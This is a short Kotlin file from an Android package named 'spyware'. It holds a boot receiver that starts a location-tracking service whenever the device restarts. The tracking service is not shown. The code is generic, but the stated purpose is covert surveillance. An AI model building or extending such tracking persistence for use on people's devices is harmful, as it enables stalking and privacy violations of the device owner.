package com.example.spyware

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.google.android.gms.location.LocationResult

class LocationReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        println("LocationReceiver onReceive")
        if (Intent.ACTION_BOOT_COMPLETED == intent?.action) {
            // Start the location service when the device boots
            val serviceIntent = Intent(context, LocationService::class.java)
            context?.startForegroundService(serviceIntent)
        }
    }
}